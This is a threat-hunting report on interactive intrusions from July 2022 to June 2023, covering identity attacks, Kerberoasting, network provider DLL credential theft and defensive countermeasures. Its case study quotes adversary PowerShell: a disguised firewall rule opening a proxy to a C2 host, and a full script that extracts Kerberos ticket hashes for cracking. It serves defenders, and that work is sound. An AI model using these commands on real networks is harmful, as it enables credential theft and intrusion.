This technology would be\ncontinuously augmented by professional, efficient incident responders who\ncould transform their front-line insights into tangible data to feed it. The final part\nof the story is that all of this would be powered by intelligence, drawing on human\nexpertise and ingenuity across a diverse range of disciplines to provide endpoint\nsecurity that is, at its core, informed by today’s threat landscape.\n\nWhen we launched this idea under the CrowdStrike banner, we told the world\n_they don’t have a malware problem, they have an adversary problem. Key to this_\nmessage is stopping the breaches perpetrated by these adversaries. Through\nthe combination of technology, people and intelligence, we raised the cost for\n_these adversaries — and continue to do so every day._\n\nIn the time since, CrowdStrike has continuously innovated. Our single-agent\ntechnology has grown into the vulnerability management space and driven\ninnovation across cloud workloads, control planes, containers and the Internet of\nThings. We fulfilled our promise to deliver government-quality intelligence for the\nprivate sector and created an elite threat hunting team known as CrowdStrike®\nFalcon OverWatch™. As the CrowdStrike Intelligence and Falcon OverWatch\nteams evolved and grew, they increasingly collaborated on developing visibility\nfrom the CrowdStrike Falcon® platform into adversary insights, culminating in\nCrowdStrike tracking over 215 adversaries today.\n\nThe key to this collaboration is speed. When we talk about creating a security\nsolution for the way the threat landscape looks today, we cannot ignore\nadversary speed. Over the past 12 months, the average breakout time for\ninteractive eCrime intrusion activity was 79 minutes. Falcon OverWatch\nwitnessed one adversary breakout time of just seven minutes. In less than\nthe time it takes to step away from your desk and make a cup of coffee, this\nadversary had landed on an initial host and moved laterally into the broader\nvictim environment.\n\nThe questions CISOs need to ask their teams are, “Have we gotten faster at\nidentifying, investigating and remediating today’s threats? Can we detect an\nadversary in seven minutes or even seven hours?”\n\nAt CrowdStrike, we asked ourselves these questions. We came together to\nfigure out how to get even faster at stopping breaches so our customers can go\nfaster. We determined that closer alignment of threat hunting and intelligence\nwould not only help us get faster but allow us to come back to the premise we\n\n\n###### Through the combination of technology, people and intelligence, we raised the cost for these adversaries — and continue to do so every day.\n\n\n-----\n\nWith the release of the CrowdStrike 2023 Threat Hunting Report, we are\nannouncing the formation of a new defensive unit: CrowdStrike Counter\nAdversary Operations. Its mission is to use the collaborative power of hunting\nand intelligence to raise the cost of doing business for threat actors and give the\nadversary nowhere to hide.\n\nThis report is the first of many publications that readers can expect from\nCrowdStrike’s newly formed Counter Adversary Operations team. This team\nformally unites Falcon OverWatch and CrowdStrike Intelligence under a single\numbrella, deepening the already well-established collaboration between these\nteams.\n\nThis year’s report is the culmination of the past 12 months of proactive,\nintelligence-informed threat hunting. In this 12-month period, Falcon OverWatch\nthreat hunters:\n\n###### ¼ Directly identified approximately one potential intrusion every seven\n**minutes. Over the course of a year, this adds up to tens of thousands of**\ninstances where human-driven hunting was instrumental in uncovering\nadversaries actively seeking to evade autonomous detection methods.\n\n###### ¼ Distilled their findings into the development of hundreds of new\n**behavioral-based preventions. In practice, this means at least once**\nper day on average, Falcon OverWatch threat hunters’ front-line findings\ndirectly augment the Falcon platform’s ability to detect and prevent\nthe latest threats. Over the course of the past year alone, these new\nbehavioral-based detections have enabled the Falcon platform to prevent\nan additional 1.5 million malicious events that would have otherwise\nevaded autonomous detection methods.\n\nThese figures represent the Falcon OverWatch team’s around-the-clock\nefforts to disrupt the adversary. This work forces the adversary to change their\napproaches and directly raises their costs of operating.\n\nAcross all malicious activity tracked by CrowdStrike, 71% of intrusions were\nmalware-free. In a time when adversaries increasingly rely on hands-onkeyboard tactics to achieve their objectives, threat hunting operations must be\ninformed by today’s best threat intelligence.\n\nThe new Counter Adversary Operations team will relentlessly track, detect and\nultimately disrupt the adversary no matter when or where they operate.\n\n###### Adam Meyers\n\nSVP of Intelligence\n\n\n###### One potential intrusion approximately every           seven minutes\n\n 1.5 million additional malicious events directly prevented by the Falcon platform\n\n\n-----\n\n#### Contents\n\n###### Foreword\b 2\n\n Introduction\b 5\n\n Front-Line Snapshot\b 6\n\n Front-Line Observations\b 10\n\n Î Adversaries Advance the Frontier of Identity Threats \b 10\n\n ³ Don’t Get Burned by Kerberoasting \b 11\n\n ³ Beyond Usernames and Passwords \b 16\n\n ³ Spotlight: Falcon OverWatch Identifies Missing MITRE Identity Technique \b 18\n\n Î Left of Theft: Themes of Early-Stage eCrime \b 20\n\n ³ INDRIK SPIDER Brings the Tailored Experience to Opportunistic eCrime \b 21\n\n ³ Access Brokers Abuse Vulnerabilities for Initial Access\b 23\n\n ³ Remote Monitoring and Management Tools \b 26\n\n Î Adversaries Lead the Charge in Cloud Know-How\b 32\n\n ³ Adversaries Leverage LinPEAS Tool for Cloud Discovery\b 32\n\n ³ eCrime Adversaries Use Azure Run Commands to Deploy Malware \b 35\n\n ³ Compromised Cloud Credentials Facilitate Widespread Lateral Movement  \b 37\n\n Î Cross-Platform Proficiency Takes Center Stage       38\n\n ³ Linux Insights and Trends  39\n\n ³ macOS Insights and Trends  41\n\n ³ Threat Actor Spotlight: LABYRINTH CHOLLIMA  44\n\n Conclusion     45 \n\n About Falcon OverWatch  46\n\n CrowdStrike Products and Services  47\n\n About CrowdStrike  54\n\n\n-----\n\n## Introduction\n\nIdentity threats emerged as the major theme of interactive — aka hands-on-keyboard — intrusions\ndiscovered by the CrowdStrike® Falcon OverWatch™ threat hunting team in the past 12 months. In all aspects\nof operations, adversaries looked for ways to broaden their reach, optimize their tradecraft and deepen their impact.\nThese operations often started with an identity compromise. Adversaries are not relying solely on compromised\nvalid credentials, either — rather, they demonstrated their capacity to abuse all forms of identification and\nauthorization, including weak credentials purchased from the underground, and they elevated their phishing\nand social engineering tradecraft.\n\nIn addition to the broad targeting of identity, several trends stood out this year related to eCrime. First, the continued\nexploitation of vulnerable software to gain access, particularly in the case of access brokers,[1] demonstrates the need\nfor organizations to have visibility into their external attack surface. The expanded use of zero-day vulnerabilities and\nthe speed at which threat actors were able to develop N-day exploits underscore the importance of vulnerability\nmanagement and patching. Second, the rampant use of legitimate remote monitoring and management (RMM)\ntools illustrates adversaries’ attempts to blend into enterprise noise and avoid detection. SCATTERED SPIDER, for\nexample, utilizes numerous RMM tools, enabling them to avoid detection for protracted periods of time to access\nsensitive data and — more recently — deploy ransomware. Finally, Falcon OverWatch observed adversaries such\nas INDRIK SPIDER following their otherwise opportunistic initial access attempts with more tailored follow-on\nbehaviors.\n\nConsistent with the expectations outlined in last year’s report, Falcon OverWatch observed adversaries’\nincreased proficiency in attacks against cloud environments. In the past few months, adversaries have continued\nto demonstrate that they are adept at navigating all major cloud platforms. In particular, adversaries have been quick\nto learn how to take advantage of common misconfigurations or abuse the built-in cloud management tooling.\nThe concerning reality is that some adversaries appear to have a better handle on victims’ cloud environments\nthan the organizations themselves.\n\nFinally, cross-platform proficiency is a hallmark of this year’s interactive intrusions. Exemplified by the 3CX\nsupply chain attack perpetrated by LABYRINTH CHOLLIMA — and uncovered by CrowdStrike — many of today’s\nadversaries are able to confidently navigate multiple operating systems. Whether the adversary is leveraging native\napplications or cross-platform development tools, the need to be flexible and adapt to any target environment is\nparamount to continued operational success.\n\n\n###### Reader Note:\n\nThis report is based on insights from the Falcon OverWatch threat hunting team from July 1, 2022,\nthrough June 30, 2023.[2] The findings relate specifically to interactive intrusion activity — that is, activity\nwhere a threat actor was operating with hands-on-keyboard in a victim environment. Targeted adversaries\nrefer to state-nexus adversaries.\n\n\n1 Access brokers are threat actors that specialize in breaching networks with the intention of selling or providing that access to others.\n\n\n-----\n\n## Front-Line Snapshot\n\nIn the reporting period from July 1, 2022, through June 30, 2023, Falcon OverWatch observed interactive intrusion\nvolumes continue to climb, with a total year-over-year increase of 40%. The overall distribution of interactive intrusion\nactivity by threat type remained relatively constant this year compared to previous years, with a small decrease in the\nproportion of targeted intrusion activity.\n\n\n###### INTERACTIVE INTRUSION VOLUMES BY REPORTING YEAR\n\n\n###### 2019 2020 2021 2022 2023\n\n Figure 1. Interactive intrusions over time, 2019 to 2023\n\n\nFor the sixth consecutive year, the technology vertical topped the list for the most frequently targeted industry\nvertical.

Top 10 targeted verticals, July 2022 to June 2023\n\n\n###### Figure 3. Top five targeted verticals separated by adversary threat type, July 2022 to June 2023\n\n\nIn the past year, the volume of interactive intrusion activity against the financial services industry increased by\nover 80%. Defenders in the financial industry should watch this trend closely, as the increased volume of activity\nis matched by an increased diversity of threats. This year, Falcon OverWatch uncovered activity in the financial\nindustry spanning all adversary motivation types and targeting all three major operating systems as well as cloud\ninfrastructure.\n\nNorth Korean adversaries are the most aggressive state-sponsored adversaries to target the financial sector. They\ncontinue to engage in prolific, financially motivated operations primarily targeting financial and financial technology\n(fintech) organizations. eCrime threat actors also routinely target the financial sector. Though some adversaries\nfocus on stealing cryptocurrency or non-fungible tokens (NFTs), opportunistic big game hunting (BGH) ransomware\nand data theft campaigns remain the primary eCrime threat to financial institutions. Due to the victim organization's\nneed to maintain system uptime and the sensitive nature of the sector, eCrime threat actors likely conclude that\nfinancial institutions are willing and able to pay ransom demands.\n\n\n-----\n\nAcademic\nAgriculture\nConsulting\nEnergy\nEngineering\nFinancial\nGovernment\nHealthcare\nHospitality\nInsurance\nLegal\nManufacturing\n\nMedia\n\nMining\n\nNonprofit\n\nPharmaceutical\n\nReal Estate\n\nRetail\n\nServices\n\nTechnology\n\nTelecommunications\n\nTransportation and Logistics\n\n###### Figure 4. Intrusion activity by threat actor heat map, July 2022 to June 2023\n\nPlease note the following about the data presented in this heat map:\n\n###### ¼ The heat mapping represents the number of distinct adversaries active within a particular vertical\n\n ¼ The heat mapping does not represent the total number of intrusion attempts within a vertical, as multiple\nintrusions by the same adversary group are represented only once\n\n###### ¼ Attribution to a high degree of confidence is not always possible. This table does not reflect any unattributed\nactivity that occurred in any industry verticals\n\nTargeted intrusion activity during this period notably correlated with the respective intelligence collection\nrequirements and other priorities of each adversary grouping. The most straightforward of these is North Korean\nadversaries’ targeting of financial sector entities — as well as finance-related consulting services — as part of a\nwidespread currency generation effort meant to leverage cryptocurrency theft and, to a lesser extent, ransomware.\nThe diversity of sectors targeted by Iranian (KITTEN) and Chinese (PANDA) state-nexus adversaries are reflective\nof two distinct, but similar, tradecraft strategies. KITTEN adversaries increasingly rely on opportunistic exploitation\nof entities of interest, and PANDA adversaries continue to expand operations to achieve coverage across as many\ntargets as possible.\n\nThe technology sector continues to be a high-value target for eCrime adversaries, with BGH operations posing\nthe most prevalent eCrime threat to the sector. The technology sector’s reliance on and access to highly sensitive\ndata make it an especially attractive target for BGH operators. BGH operations continue to rely on ransomware and\ndata theft. Other prominent eCrime threats to the technology sector include enabling services, access brokers and\ninformation theft campaigns.\n\n|BEAR RUSSIA|CHOLLIMA N.

MITRE ATT&CK heat map highlighting the top five techniques Falcon OverWatch observed adversaries use in each tactic area, June 2022 to July 2023\n\nFalcon OverWatch tracks interactive intrusion activity against the MITRE ATT&CK® Enterprise Matrix, a framework that\ncategorizes and tracks adversary behavior.[3]\n\nThis heat map illustrates the top five techniques observed across the interactive intrusion activity discovered by Falcon\nOverWatch in each tactic area during the past year. The technique prevalence underscores a notable shift toward\nexploitation of identity across all stages of adversarial operations. This shift mirrors the evolution of organizations\nadapting to an increasingly disparate workforce, highlighting the morphing nature of the modern perimeter.\n\nNo longer defined by a rigid outer shell, organizations today rely on identity as the pivotal control point. The consistent\nappearance of valid accounts across various tactics highlights the intensification of adversaries' strategic use of trusted\naccounts to gain initial access, establish persistence, elevate privileges and evade defenses. The concerning ease with\nwhich adversaries can gain initial access — often simply through purchases — blurs the distinction between legitimate\nusers and imposters. Identifying such stealthy intruders necessitates proactive, identity-based threat hunting combined\nwith a robust understanding of an organization's unique operational landscape.\n\n[For full details of the techniques and sub-techniques observed by Falcon OverWatch, see the Falcon OverWatch 2023](https://www.crowdstrike.com/wp-content/uploads/2023/08/mitre-attack-heat-map.pdf)\n[MITRE ATT&CK heat map.](https://www.crowdstrike.com/wp-content/uploads/2023/08/mitre-attack-heat-map.pdf)\n\n\n-----\n\n## Front-Line Observations\n\n#### Adversaries Advance the Frontier of Identity Threats\n\nToday, 80% of breaches use compromised identities.[4] The abuse of identity,\nparticularly when coupled with creative defense evasion methodologies, enables\nadversaries to hide in plain sight. Despite identity being widely recognized as a\ngrowing security threat, the full spectrum of identity threats is not always well\nunderstood.\n\n\n###### Reader Note:\n\nIdentity data refers to any information that uniquely identifies an individual\nor entity (such as data associated with accounts) and authentication and\naccess controls (such as credentials, permissions, security tokens or digital\ncertificates). This scope may extend to additional factors of authentication\nor data that can be used for the purposes of identity verification. A full list\ncan be seen on page 16.\n\n\nTo ensure environments remain protected, hunters must work with the broadest\npossible definition of identity, as these types of data are prime targets for\nadversaries looking to maintain access, enable lateral movement and steal\ninformation.\n\nTaking a closer look at the specific techniques involved in identity threats reveals\nan interesting duality between new and old. Falcon OverWatch recently discovered\nand documented the abuse of network provider dynamic link libraries (DLLs) as a\nmeans to harvest valid credentials. A network provider DLL enables the Windows\noperating system to communicate with other types of networks by providing\nsupport for different networking protocols. This newly documented sub-technique[5]\nsees adversaries operate without the need to touch the Local Security Authority\nSubsystem Service (LSASS) or dump the system Security Account Manager (SAM)\nhive, both of which are often highly monitored by security tools. This sub-technique\nprovides an evasive way to access valid account details. In contrast, threat hunters\nalso tracked a surge in an old and well-understood technique — Kerberoasting —\nwith the resurgence likely due to continued effectiveness.\n\n\n##### Key Facts and Figures at a Glance:\n\n### 62%\n```\n  OF INTERACTIVE INTRUSIONS\n  INVOLVING THE ABUSE OF\n  VALID ACCOUNTS, WITH 34%\n  OF INTRUSIONS SPECIFICALLY\n  INVOLVED THE USE OF DOMAIN\n  ACCOUNTS OR DEFAULT ACCOUNTS\n\n 160%\n  INCREASE IN ATTEMPTS TO\n  GATHER SECRET KEYS AND OTHER\n  CREDENTIAL MATERIALS VIA\n  CLOUD INSTANCE METADATA APIs\n\n 583%\n  INCREASE IN KERBEROASTING\n  ATTACKS (A SUB-TECHNIQUE\n  OF STEAL OR FORGE KERBEROS\n  TICKETS), WITH VICE SPIDER\n  RESPONSIBLE FOR 27% OF ALL\n  KERBEROASTING ATTACKS\n\n```\n\n-----\n\n```\nDON’T GET BURNED BY KERBEROASTING\n\n```\n\nOver the past year, Falcon OverWatch observed a staggering 583% increase\nin Kerberoasting attacks[6] to escalate privileges and enable lateral movement\nwithin a victim’s environment (see Figure 6). Windows devices use the Kerberos\nauthentication protocol, which grants tickets to provide users access based on\nservice principal names (SPNs). Kerberoasting specifically involves the theft of\ntickets associated with SPNs. These tickets contain encrypted credentials that can\nbe cracked offline using brute-force methods to uncover the plaintext credentials.\n\nKerberoasting is a beneficial technique for adversaries because it targets an\nSPN associated with an Active Directory account, and because these SPNs are\noften tied to service accounts, they will usually have higher privileges and allow\nthe adversary to extend their reach and gain access to sensitive files or systems.\nAdditionally, these attacks can be challenging to detect because Kerberos activity is\nso prevalent in everyday telemetry, which allows adversaries to blend into the noise.\n\nDespite being well documented, this technique poses a significant threat to\norganizations because adversaries do not need elevated privileges to execute this\nattack. In the past year, attacks against Kerberos were associated predominantly\nwith eCrime adversaries. VICE SPIDER was the most prolific eCrime adversary,\nresponsible for 27% of all intrusions that involved the Kerberoasting technique.\n\n**INCIDENTS OF KERBEROASTING**\n\n\n**2022**\n**Reporting**\n**Period**\n\n\n**2023**\n**Reporting**\n**Period**\n\n\n###### Figure 6. Intrusions featuring Kerberoasting attacks\n\nOf the interactive intrusions that involved the use of Kerberoasting, Falcon\nOverWatch identified a range of initial access vectors, including password spraying,\naccessing existing remote services through valid accounts, and exploiting\nvulnerable web servers though web application attacks. It is not unusual for Falcon\nOverWatch to observe Kerberoasting being used to facilitate lateral movement from\na host without appropriate endpoint security coverage.\n\n\n###### Service Principal Name (SPN)\n\nAn SPN is a unique identifier for services\nrunning on servers in Active Directory. It is\nespecially important when using Kerberos\nauthentication. An SPN allows a service\nto be mapped to a specific server, which\nhelps a client find that service within the\nnetwork. It also lets clients request service\nauthentication, even without knowing the\naccount name. Adversaries can misuse this\nfeature by scanning for SPNs associated\nwith high-privilege accounts. They can\nperform attacks like Kerberoasting to\ncrack passwords and potentially gain\nunauthorized access to resources.\n\n\n-----\n\n##### Kerberoasting in Action\n\nIn an intrusion by VICE SPIDER, Falcon OverWatch discovered hands-on-keyboard activity against a victim\norganization in the academic sector. The compromise was associated with multiple hosts across virtual desktop\ninfrastructure (VDI). The threat actor performed basic host reconnaissance to enumerate domain trusts using nltest,\nthen enumerated administrator permissions groups and performed connectivity tests to outbound infrastructure.\n\nNext, the threat actor attempted to exploit the ZeroLogon vulnerability in an attempt to escalate privileges and then\ntested connectivity to a command-and-control (C2) server using ping. The threat actor then executed SystemBC\nand SocksProxyGo through PowerShell to proxy connections to their C2 infrastructure. The adversary was clearly\nmindful of being detected and took several steps to cover their tracks, including setting their proxy connection to\noperate over non-standard ports, creating a new firewall rule masquerading as a Windows update, and clearing the\nSecurity, Application and System logs using wevtutil. Further, they removed the registry entry for RunMRU and\nTypedPaths — two locations that would shed light on their interactive activity on the system.\n\n###### Snippet of SocksProxyGo execution to configure a new outbound firewall rule\n```\nNew-NetFirewallRule -DisplayName \"Windows Update\" -Direction Outbound -Action Allow -Protocol\nTCP -RemotePort 443 -Enabled True | Out-Null; Go -remotePort 443 -remoteHost \"[REDACTED\nIPAddress]\"\n\n Snippet of the SystemBC proxy connection being established\n$domain = '[REDACTED IPAddress]' # host $dport = 4001 # port $x = New-Object byte[] 50 For\n($i=0; $i -ne 50; $i++)\n\n```\nAfter this, the adversary executed a script to perform a Kerberoasting attack and enumerate SPNs. VICE SPIDER’s\nlikely goal was to capture these SPNs to identify Windows service accounts and extract the password hashes. This\nwas confirmed when Falcon OverWatch found the adversary using the Hashcat tool in an attempt to brute-force the\npassword hashes.\n\n###### Snippet of a script execution in an attempt to enumerate SPNs\n```\n$Null = [Reflection.Assembly]::LoadWithPartialName( 'System.IdentityModel' ); $search\n= New-Object DirectoryServices.DirectorySearcher( [ADSI]'' ); $search.filter =\n'(&(servicePrincipalName=*)(objectCategory=user))'; $results = $search.Findall(); foreach (\n$results in $results ) { $u = $results.GetDirectoryEntry(); $samAccountName = $u.samAccountName;\nforeach ( $s in $u.servicePrincipalName )\n\n```\n\n-----\n\nThe following is an expanded version of the script above, which was determined to be associated with the Invoke```\nKerberoast.ps1 PowerShell script. The Kerberoasting activity below involves Active Directory being queried to\n\n```\nrequest the username and SPN associated with accounts that have an SPN set. The $TicketHexStream variable is\nstoring the hexadecimal value of the Kerberos service ticket, which is then processed to extract a hash that can be\nused for offline password cracking.\n```\n$Null = [Reflection.Assembly]::LoadWithPartialName( 'System.IdentityModel' ); $search\n= New-Object DirectoryServices.DirectorySearcher( [ADSI]'' ); $search.filter =\n'(&(servicePrincipalName=*)(objectCategory=user))'; $results = $search.Findall();\nforeach ( $results in $results ) { $u = $results.GetDirectoryEntry(); $samAccountName =\n$u.samAccountName; foreach ( $s in $u.servicePrincipalName ) { $Ticket = $null; try { $Ticket\n= New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $s;\n} catch [System.Management.Automation.MethodInvocationException] {} if ( $Ticket -ne $null\n) { $TicketByteStream = $Ticket.GetRequest(); if ( $TicketByteStream ) { $TicketHexStream\n= [System.BitConverter]::ToString( $TicketByteStream ) -replace '-'; [System.Collections.\nArrayList]$Parts = ( $TicketHexStream -replace '^(.*?)04820...(.*)', '$2' ) -Split 'A48201';\n$Parts.RemoveAt( $Parts.Count - 1 ); $Hash = $Parts -join 'A48201'; try { $Hash = $Hash.Insert(\n32, '$' ); $HashFormat = '$krb5tgs$23$*' + $samAccountName + '/' + $s + '*$' + $Hash; Write-Host\n$HashFormat; break; } catch [System.Management.Automation.MethodInvocationException] {} } } } }\n\n```\n\n-----\n\n##### Top Five Tools Used in Kerberoasting Attacks\n\nThe following table lists — in order — the top five tools Falcon OverWatch observed adversaries use for Kerberoasting\nattacks over the past year.\n\n###### Tool What It Does How It Works\n\n\n# 1\n\n 2\n\n 3\n\n 4\n\n 5\n\n\n###### Rubeus Rubeus is a C# tool that allows an adversary to interact\n\nwith the Kerberos authentication mechanism.\n\n###### PowerSploit PowerSploit is an exploit framework that contains various\n\nmodules, including Invoke-Kerberoast, a module designed\n\nto automate Kerberoasting functions.\n\n\n###### BloodHound/ SharpHound\n\n\nBloodHound is a web-based tool that can be used\n\nto perform reconnaissance on Active Directory\n\nenvironments and identify attack paths that can be used in\n\nthe context of a Kerberoasting attack.\n\nSharpHound is a PowerShell-based tool that can be used\n\nto enumerate Active Directory environments and retrieve\n\ndata that can be visualized within BloodHound.\n\n\nAdversaries use this tool to perform attacks such\n\nas ticket manipulation, password brute-forcing,\n\nKerberoasting, and Golden Ticket and Silver Ticket\n\nattacks.\n\nAdversaries use this tool to automate the process of\n\nSPN enumeration, ticket manipulation and password\n\ncracking.\n\nAdversaries typically use these tools together to\n\nunderstand and visualize a target’s Active Directory\n\nobjects and environment, and then generate data\n\nthat can be used to identify potential attack paths and\n\nprivilege escalation opportunities.\n\nThe GetUserSPNs utility can be used to enumerate\n\nservice accounts within Active Directory by requesting\n\nservice tickets for any accounts with associated SPNs.\n\nThe Ticketer utility can be used to request service\n\ntickets with specific encryption types, which may\n\ncause the domain controller to encrypt the ticket with\n\nthe user's password hash. This utility can then decrypt\n\nthe service ticket to extract the password hash of a\n\nuser.\n\nAdversaries can use this tool to perform SPN\n\nenumeration and output results into various formats\n\nfor analysis. The tool also performs the same functions\n\nas Ticketer, whereby it can decrypt service tickets to\n\nextract the password hash of a user.\n\n\n###### Impacket Impacket is a toolset of Python-based utilities that can\n\nbe used to perform a wide range of attacks, including\n\n\nlaunching attacks to exploit weaknesses in the Kerberos\n\nprotocol. Popular Impacket tools for performing\n\nKerberoasting attacks include GetUserSPNs and\n\nTicketer.\n\n###### SharpRoast SharpRoast is a C# tool within the SharpTools toolset.\n\nThe SharpRoast tool can be used to interact with the\n\nKerberos protocol to perform Kerberoasting attacks.\n\n\n###### Table 1. Top five tools Falcon OverWatch observed adversaries use for Kerberoasting attacks, July 2022 to June 2023\n\n\n-----\n\n##### Defensive Countermeasures\n\nFalcon OverWatch increasingly sees adversaries using Kerberoasting to gain a\ngreater foothold within Windows environments and escalate privileges. Defenders\nshould investigate for signs of this activity to help identify protocol weaknesses and\nweak or compromised accounts, and find opportunities to improve detections.\n\nThe following recommendations will allow hunters to identify or mitigate this type of\nattack within their environment:\n\n###### Interrogate Windows Event logs.\n\nBoth Security Event ID 4769 (Kerberos Service Ticket Request) and Event ID 4771\n(Kerberos Pre-Authentication Failure) can indicate that Kerberoasting is taking\nplace, especially when seen in large volumes over a short time period. Security\nEvent ID 4769 should be filtered to look for Ticket Encryption Type 0x17 and 0x18,\nwhich indicate a weak RC4 cipher has been used that is prone to being cracked.\n\n###### Filter for Kerberos network traffic that has RC4 encryption.\n\nAdversaries usually opt to exploit RC4 because it is insecure. RC4 replies can be\nindicative of an adversary attempting to request service tickets using this type of\nencryption. Defenders should disable RC4 where possible, as it is vulnerable to\nattack — and where possible, AES Kerberos encryption should be enabled.\n\n###### Audit activity for accounts that are likely targets for Kerberoasting.\n\nThis can be done by reviewing the Active Directory settings to see which service\naccounts have SPNs registered to them.\n\n###### Ensure service account passwords are complex.\n\nThis will make them more resistant to password cracking attempts. Ensuring unique\npasswords are used for each service account will prevent one compromise from\naffecting multiple accounts.\n\n###### Take offensive action.\n\nConsider implementing a honey token approach to detect the use of service\naccounts with SPNs that have been deployed with weak passwords.\n\n\n-----\n\n```\nBEYOND USERNAMES AND PASSWORDS\n\n```\n\nWhen discussing identity threats, it is important to distinguish different ways an entity can be identified and\nauthenticated to a system. Though the majority of interactive intrusions observed by Falcon OverWatch involve\nabuse of valid accounts[7] — which in most instances presents as username and password combinations — intrusions\noften leverage other factors of authentication and identifying material. Some of the most common methods of\nidentification and authentication are shown in Figure 7.\n\n\n###### Username and password or PIN\n\n\n###### Session-based authentication, cookie-based authentication and JSON Web Tokens (JWT)\n\n\nAuthentication using a username and\npassword or PIN\n\n\n###### Smart card and PIN\n\n\nAuthentication to an application or system using\nan already created valid session or access token\n\n\nAuthentication using a physical item\npaired with a PIN\n\n\n###### Kerberos and Kerberos tickets\n\n\n###### Valid account and Active Directory certificates\n\n\nAuthentication via tickets granted from a key\ndistribution center (KDC), which are usually\ngranted from use of a username and password\n\n\nAuthentication of application programming\ninterfaces (APIs)\n\n\n###### Biometrics such as facial recognition, voice recognition, fingerprint recognition\n\n\n###### APIs and secret keys\n\n\nAuthentication of computer or users using public\nkey infrastructure\n\n\nAuthentication through use of biometrics such as\nfingerprint, face or voice, which compares these\nfeatures to a saved template per user\n\n\n###### Identity providers and protocols such as SAML and OAuth\n\n\n###### Hardware and software tokens or time-based one-time password (TOTP)\n\n\nAuthentication of one or more identity providers\nthrough a service such as federation single sign-on\n(SSO)\n\n\nAuthentication that requires a second element,\ne.g., a time-based one-time password, physical\nitem or application\n\n\n###### Figure 7. Commonly observed methods of identification and authentication\n\nSome less traditional means of identity abuse include the following:\n\n###### ¼ Attempts to gather secret keys and other credential materials via cloud instance metadata APIs, which rose by\n160% year over year\n\n###### ¼ Exploitation of weaknesses in Kerberos security to steal or forge authentication material, which rose by 410%\nyear over year (the specific sub-technique of Kerberoasting rose by 583% year over year)\n\n###### ¼ Pass-the-Hash attacks, which rose by 200% year over year\n\n ¼ Abuse of Active Directory Certificate Services (AD CS), which was seen in the 2023 reporting period but not\nthe 2022 reporting period\n\n\n-----\n\nThis targeting of identity and authentication material showcases that valid accounts are highly prized by adversaries.\nOver the past year, 62% of all interactive intrusions used valid accounts. Adversaries do not stop there — 26% of all\nintrusions involved attempts to dump credentials,[8 ]and 11% involved attempts to target unsecured credentials.[9] All\nof this can facilitate access to sensitive data or support privilege escalation or lateral movement. Falcon OverWatch\nalso observed adversaries targeting credentials in password stores,[10] capturing user input[11] and modifying the\nauthentication process[12] itself.\n\nThreat actors are also seeking new and novel tactics in operations aimed at gaining credentials for cloud\nenvironments. In November 2022, a victim organization in a CrowdStrike Services case accidentally published its\ncloud service provider root account’s access key credentials to GitHub. Within seconds, automated scanners and\nmultiple threat actors attempted to use the compromised credentials. The speed with which this abuse was initiated\nsuggests that multiple threat actors — in efforts to target cloud environments — maintain automated tooling to\nmonitor services such as GitHub for leaked cloud credentials.\n\nDefenders may wonder how else adversaries are obtaining these valid login details. Interestingly, only 14% of\nintrusions where valid accounts were used also involved a brute-force[13] attack. Of the remaining 86% of intrusions\ninvolving a valid account, over half originated from a system external to the organization. This suggests these\naccounts were likely obtained through credential harvesting, password reuse, phishing, an insider threat, or session\nhijacking, or they were purchased from an initial access broker.\n\n##### Defensive Countermeasures\n\n###### Audit your user accounts.\n\nA key step for defenders in identifying identity-based risks in their organization is auditing the vast array of different\nuser accounts that may be available to an adversary and ensuring that these implement the principle of least privilege\nand role-based access control.\n\n###### Leverage the right tools and processes to secure your identities.\n\nWhen it comes to stopping identity threats in their tracks, two key tools at an organization’s disposal are\nimplementing a Zero Trust[14] model and implementing proactive and continuous hunting across identity for\nanomalous user behavior.\n\n8 [For more information on this technique, see the MITRE website: https://attack.mitre.org/techniques/T1003/.](https://attack.mitre.org/techniques/T1003/)\n\n9 [For more information on this technique, see the MITRE website: https://attack.mitre.org/techniques/T1552/.](https://attack.mitre.org/techniques/T1552/)\n\n10 [For more information on this technique, see the MITRE website: https://attack.mitre.org/techniques/T1555/.](https://attack.mitre.org/techniques/T1555/)\n\n11 [For more information on this technique, see the MITRE website: https://attack.mitre.org/techniques/T1056/.](https://attack.mitre.org/techniques/T1056/)\n\n12 [For more information on this technique, see the MITRE website: https://attack.mitre.org/techniques/T1556/.](https://attack.mitre.org/techniques/T1556/)\n\n13 [For more information on this technique, see the MITRE website: https://attack.mitre.org/techniques/T1110/.](https://attack.mitre.org/techniques/T1110/)\n\n\n-----\n\n```\nSPOTLIGHT: FALCON OVERWATCH IDENTIFIES\nMISSING MITRE IDENTITY TECHNIQUE\n\n```\nFalcon OverWatch analyzes and records its interactive intrusion data using MITRE\nATT&CK as an organizing framework. In the process of examining intrusion activity,\nanalysts occasionally discover new techniques and sub-techniques not accounted\nfor by the framework. Falcon OverWatch recently recommended to MITRE the\ncreation of a new sub-technique called “Network Provider DLL” under the technique\n“Modify Authentication Process.” The new sub-technique was accepted and\nincluded in ATT&CK v13 under ID T1556.008.[15]\n\nA network provider DLL enables the Windows operating system to communicate\nwith other types of networks by providing support for different networking\nprotocols. Because some protocols may involve authentication, a network provider\nDLL can also function as a credential manager. When serving as a credential\nmanager, whenever a login or password change has occurred, registered network\nprovider DLLs are notified and the username and password involved are sent as\npart of this notification.\n\nOver the past year, Falcon OverWatch observed malicious network provider DLLs\nbeing abused to harvest usernames and passwords by writing these to disk for\nexfiltration. In multiple intrusions where Modify Authentication Process: Network\nProvider DLL was leveraged, an adversary was observed conducting intrusions\nagainst Microsoft Exchange servers. This specific activity has been observed\nsince at least March 2022, with increasing operational tempo into late 2022.\nThis coincides with proof-of-concept code that was publicly released for two\nvulnerabilities: CVE-2022-41040 and CVE-2022-41082 (collectively, these are\ncommonly referred to as ProxyNotShell).\n\nThe unidentified adversary attempted to deploy a malicious network provider DLL\nonto Exchange systems designed to harvest credentials. This malicious network\nprovider DLL masqueraded as the LSASS using the name `lsass.dll – the entire`\nprocess is detailed in Figure 8. What makes these intrusions notable is that if\nsuccessfully deployed on an Exchange server, the malicious DLL can be leveraged\nto access a large number of usernames, emails and passwords without the need\nto touch LSASS or dump the system SAM hive, both of which are often highly\nmonitored by security tools. This sub-technique does not need to be deployed to\nan Exchange server, and credentials can still be harvested using this technique on\nother Windows systems such as user workstations.\n\n\n-----\n\n###### Figure 8. Overarching attack chain of adversary intrusion\n\n\n-----\n\n#### Left of Theft: Themes of Early-Stage eCrime\n\nIn recent years, eCrime tradecraft has been one of the most dynamic aspects\nof the threat landscape. Adversaries in the eCrime ecosystem are making\nadvances in their speed, efficacy and organization, resulting in 